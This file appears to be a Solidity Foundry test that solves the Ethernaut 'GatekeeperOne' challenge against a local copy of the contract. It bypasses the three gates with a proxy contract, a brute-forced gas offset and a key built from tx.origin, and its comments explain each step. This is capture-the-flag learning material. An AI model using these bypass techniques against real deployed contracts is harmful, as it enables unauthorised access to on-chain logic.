// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "forge-std/Test.sol";
import "../utils.sol";

// ?
import 'openzeppelin-contracts/contracts/utils/math/SafeMath.sol';

contract GatekeeperOne {

  using SafeMath for uint256;
  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(gasleft().mod(8191) == 0);
    console.log("MARK TWAIN");
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
    require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
    require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    console.log("muy bien");
    entrant = tx.origin;
    return true;
  }
}

contract Proxy {
  function enter(address _gateKeeperAddress, bytes8 _key) external {
    (bool success,) = _gateKeeperAddress.call(abi.encodeWithSignature("enter(bytes8)", _key));
    if (!success) revert();
  }
}

contract GatekeeperOneTest is Test {
  address internal challengeAddress;

  function setUp() public {
    // challengeAddress = utils.createLevelInstance(0x9b261b23cE149422DE75907C6ac0C30cEc4e652A);
  }

  function testExploit() public {
    // ?
    GatekeeperOne gk1 = new GatekeeperOne();

    // gateOne
    //   is passed through by using a proxy contract
    //
    // gateTwo
    //   build a simpler contract, and run an iteration
    //   of  `.call{gas: (8191 * 5) + i}` to find `i`
    //
    // gateThree
    //   just console.log() the operations on 0x1122334455667788
    //   use your fav REPL to get the hex conversions
    //
    //    uint32(uint64(_gateKey))   -> 0x1122334455667788 => 0x55667788
    //    uint16(uint64(_gateKey))   -> 0x1122334455667788 => 0x00007788
    //    uint64(_gateKey)           -> 0x1122334455667788 => 0x1122334455667788
    //    uint16(uint160(tx.origin)) -> 0x00a3...ea72 => ea72
    //
    //    gateThree part one can be true with 0x1122334400007788
    //    gateThree part two needs both to be different, which is true
    //    gateThree part three, make 7788 equal to the last hex digits of tx.origin
    //      ex: 0x1122334400007788 => 0x112233440000ea72
    //      in fact, it can be 0x100000000000ea72,
    //      which makes it straighforward to get analytically.

    bytes8 key = bytes8(uint16(uint160(tx.origin)) + 0x1000000000000000);

    Proxy proxy = new Proxy();
    proxy.enter{gas: (8191 * 5) + 1577}(address(gk1), key);




    // utils.submitLevelInstance(challengeAddress);
  }
}
